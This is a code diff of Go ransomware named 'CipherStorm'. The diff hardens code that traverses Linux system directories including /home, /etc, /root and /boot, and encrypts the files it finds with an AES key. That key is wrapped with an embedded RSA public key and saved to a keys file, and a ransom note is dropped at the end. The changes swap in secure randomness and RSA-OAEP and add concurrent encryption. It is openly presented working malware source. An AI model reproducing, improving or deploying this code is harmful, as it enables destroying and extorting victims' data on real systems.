@@ -5,17 +5,15 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/sha256"
 	"crypto/x509"
 	"encoding/pem"
 	"io"
 	"io/fs"
-	random "math/rand"
 	"os"
 	"path/filepath"
 	"slices"
-	"strconv"
 	"strings"
-	"time"
 )
 
 var EXT = []string{
@@ -28,7 +26,7 @@ var EXT = []string{
 }
 var FILES = []string{}
 
-const publicKeyFile = `-----BEGIN PUBLIC KEY-----
+const public_Key = `-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA5ITxibqvxk1GQ0kXAWaR
 VIz45Lc/y5Fgj1HpCZ14HSWBsPgeS6qRxQtooQr7h6BBfwF40sM+xOtadTJ+MNEv
 tCXRBB8OmPNPRf3HV1y9ZnGTnBCgMm/jJ1kzs1no2bEv/9QcmUWuYn/DoMfGjGQO
@@ -44,7 +42,7 @@ St6kW8kUefnfYuFgWq92TOMCAwEAAQ==
 -----END PUBLIC KEY-----`
 
 func rsa_encode(aes_key []byte) error {
-	block, _ := pem.Decode([]byte(publicKeyFile))
+	block, _ := pem.Decode([]byte(public_Key))
 	if block == nil || block.Type != "PUBLIC KEY" {
 	}
 
@@ -58,12 +56,18 @@ func rsa_encode(aes_key []byte) error {
 		return err
 	}
 	//enc aes key
-	enc_aes_key, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, aes_key)
+	enc_aes_key, err := rsa.EncryptOAEP(
+		sha256.New(),
+		rand.Reader,
+		publicKey,
+		aes_key,
+		nil,
+	)
 	if err != nil {
 		return err
 	}
 	//creating file
-	file := "CipherStorm_Keys.txt"
+	file := "CipherStorm_Keys.bin"
 	password, err := os.Create(file)
 	if err != nil {
 		return err
@@ -73,25 +77,14 @@ func rsa_encode(aes_key []byte) error {
 	return nil
 }
 
-func aes_password_generator() []byte {
-	chars := []string{"!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "-", "+", "="}
-	for i := 65; i < 91; i++ {
-		chars = append(chars, string(rune(i)))
+func aes_password_generator() ([]byte, error) {
+	length := 32
+	password := make([]byte, length)
+	_, err := rand.Read(password)
+	if err != nil {
+		return []byte{}, err
 	}
-	for i := 97; i < 123; i++ {
-		chars = append(chars, string(rune(i)))
-	}
-	for i := 0; i < 10; i++ {
-		chars = append(chars, strconv.Itoa(i))
-	}
-	r := random.New(random.NewSource(time.Now().UnixNano()))
-	var aes_gen_password string
-	i := 0
-	for i < 32 {
-		aes_gen_password += string(chars[r.Intn(len(chars))])
-		i++
-	}
-	return []byte(aes_gen_password)
+	return password, nil
 }
 
 func encrypt(byte_text []byte, byte_key []byte) ([]byte, error) {
@@ -116,7 +109,7 @@ func encrypt(byte_text []byte, byte_key []byte) ([]byte, error) {
 	return enc_byte_text, nil
 }
 
-func encrypt_file(file_name string, key []byte) error {
+func encrypt_file(file_name string, key []byte, done chan bool) error {
 	file, err := os.ReadFile(file_name)
 	if err != nil {
 		return err
@@ -131,6 +124,7 @@ func encrypt_file(file_name string, key []byte) error {
 	if err != nil {
 		return err
 	}
+	done <- true
 	return nil
 }
 
@@ -150,38 +144,57 @@ func traverse(drive string) error {
 	return nil
 }
 
-func ransom(file_name string ) error {
-    _ransom := `
-    This is a ransomeware that crypts all the data in the victims pc.
-    All the files are crypted using a public key named CipherStorm_keys.txt .
-    Deleting that file permanently crypts all your files. So i wouldn't recommend doing that.`
-
-    err := os.Create(file_name)
-    if err != nil {
-        return err
-    }
-
-    err = os.WriteFile(file_name , []byte(_ransom) , 0777)
-    if err != nil {
-        return err
-    }
-    return nil
+func ransom(file_name string) error {
+	_f, err := os.Create(file_name)
+	if err != nil {
+		return err
+	}
+	defer _f.Close()
+	_ransom := `
+	This is a ransomeware that crypts all the data in YOUR pc.
+    All the files are crypted using a AES key and saved in the file named CipherStorm_Keys.txt .
+    Deleting that file permanently crypts all your files. So i wouldn't recommend doing that.
+	`
+	err = os.WriteFile(file_name, []byte(_ransom), 0777)
+	if err != nil {
+		return err
+	}
+	return nil
 }
 
 func main() {
-	drives := []string{"/home" , "/usr" , "/etc" , "/root" , "/opt" , "/lib" , 
-        "/boot" , "/sbin" , "/bin" , "/var" , "/mnt" , "/media" , "/tmp" }
 
-    for _, drive := range(drives) {
-        traverse(drive)
-    }
+	drives := []string{"/home", "/usr", "/etc", "/root", "/opt", "/lib",
+		"/boot", "/sbin", "/bin", "/var", "/mnt", "/media", "/tmp"}
 
-	aes_gen_password := aes_password_generator()
+	for _, drive := range drives {
+		traverse(drive)
+	}
+
+	aes_gen_password, _ := aes_password_generator()
 	rsa_encode(aes_gen_password)
 
-    for _,file := range FILES {
-		encrypt_file(file, aes_gen_password)
+	done := make(chan bool)
+
+	min := func(a, b int) int {
+		if a > b {
+			return b
+		} else {
+			return a
+		}
 	}
-    
-    ransom("Cipher-Storm.txt")
+
+	for i := 0; i < len(FILES); i += 20 {
+		go func(i int) {
+			for _, file := range FILES[i:min(len(FILES), i+20)] {
+				encrypt_file(file, aes_gen_password, done)
+			}
+		}(i)
+	}
+
+	for range FILES {
+		<-done
+	}
+
+	ransom("Cipher-Storm.txt")
 }
